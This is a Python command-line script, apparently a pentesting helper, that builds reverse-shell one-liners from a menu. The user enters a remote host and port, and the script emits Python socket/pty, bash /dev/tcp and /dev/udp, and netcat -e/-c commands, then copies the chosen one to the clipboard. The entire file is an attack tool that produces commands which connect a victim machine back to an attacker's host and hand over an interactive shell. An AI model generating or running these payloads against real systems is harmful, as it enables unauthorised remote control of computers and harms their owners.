#!/usr/bin/env python3
import pyperclip as clip
import os

def menu():
    print('''
    ________MENU_________
    \n[1]. Python \n[2]. BASH \n[3]. NetCat \n[9]. Exit
          ''')

def pymenu():
    print('''
    _______PYTHON________
    \n[1]. Python 2.7 \n[2]. Python 2.7 W/ Exports \n[3]. Python 3\n[4]. Python 3 W/ Exports \n[9]. Back to Main Menu
          ''')

def pysubprocess():
    selectShell = int(input("Select Shell: "))
    if selectShell == 1:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            pymenu()
            pysubprocess()
        shell ="""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{2}")'""".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
        exit()
    if selectShell == 2:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            pymenu()
            pysubprocess()
        shell ="""export RHOST="{0}";export RPORT={1};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
        exit()
    if selectShell == 3:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            pymenu()
            pysubprocess()
        shell ="""python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{2}")'""".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
        exit()
    if selectShell == 4:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            pymenu()
            pysubprocess()
        shell ="""export RHOST="{0}";export RPORT={1};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
        exit()
    elif selectShell == 9:
        main()
    else:
        os.system("clear")
        pymenu()
        pysubprocess()

def bashmenu():
    print('''
    ________BASH_________
    \n[1]. BASH -i \n[2]. BASH 196 \n[3]. BASH -i 5 \n[4]. BASH -i UDP \n[9]. Back to Main Menu
          ''')

def bashsubprocess():
    selectShell = int(input("Select Shell: "))
    if selectShell == 1:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            bashmenu()
            bashsubprocess()
        shell = "{2} -i >& /dev/tcp/{0}/{1} 0>&1".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboard!")
        exit()
    if selectShell == 2:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            bashmenu()
            bashsubprocess()
        shell = "0<&196;exec 196<>/dev/tcp/{0}/{1}; {2} <&196 >&196 2>&196".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboard!")
        exit()
    if selectShell == 3:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            bashmenu()
            bashsubprocess()
        shell = "{2} -i 5<> /dev/tcp/{0}/{1} 0<&5 1>&5 2>&5".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboard!")
        exit()
    if selectShell == 4:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            bashmenu()
            bashsubprocess()
        shell = "{2} -i >& /dev/udp/{0}/{1} 0>&1".format(rhost, port,shellType)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboard!")
        exit()
    elif selectShell == 9:
        main()
    else:
        os.system("clear")
        bashmenu()
        bashsubprocess()

def ncmenu():
    print(''' 
    _______NETCAT________
    \n[1]. nc -e \n[2]. nc -c \n[9]. Back To main Menu
          ''')

def ncsubprocess():
    selectShell = int(input("Select Shell: ")) 
    if selectShell == 1:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9:
            os.system("clear")
            shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh" 
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
                os.system("clear")
                ncmenu()
                ncsubprocess()
        shell = "nc {0} {1} -e {2}".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboartd!")
        exit()

    if selectShell == 2:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9:
            os.system("clear")
            shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        if shellType == 9:
            os.system("clear")
            ncmenu()
            ncsubprocess()
        shell = "nc -c {2} {0} {1} ".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboartd!")
        exit()
    if selectShell == 9:
        main()
    else:
        os.system("clear")
        ncmenu()
        ncsubprocess()

def main():
    os.system("clear")
    menu()
    selectLib = int(input("Select Library: "))
    
    if selectLib == 1:
        os.system("clear")
        pymenu()
        pysubprocess()
    elif selectLib == 2:
        os.system("clear")
        bashmenu()
        bashsubprocess()
    elif selectLib == 3:
        os.system("clear")
        ncmenu()
        ncsubprocess()

    elif selectLib == 9:
        exit()
    else:
        main()

if __name__ == "__main__":
    main()
